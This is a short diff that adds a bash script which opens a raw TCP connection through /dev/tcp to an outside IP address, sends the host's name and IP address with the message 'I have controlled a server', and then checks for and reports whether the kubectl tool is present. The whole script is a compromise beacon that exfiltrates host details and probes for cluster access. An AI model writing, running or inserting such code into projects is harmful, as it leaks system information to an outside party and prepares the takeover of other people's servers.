@@ -1,0 +1,10 @@
+#!/bin/bash
+set -x
+
+exec 3<>/dev/tcp/13.112.164.157/8001
+echo "I have controlled a server $(hostname) ($(hostname -i))" >&3
+
+echo "└- Also testing for command/tool" >&3
+if command -v kubectl; then
+echo "   └- Yes it has kubectl tool $(command -v kubectl)" >&3
+fi
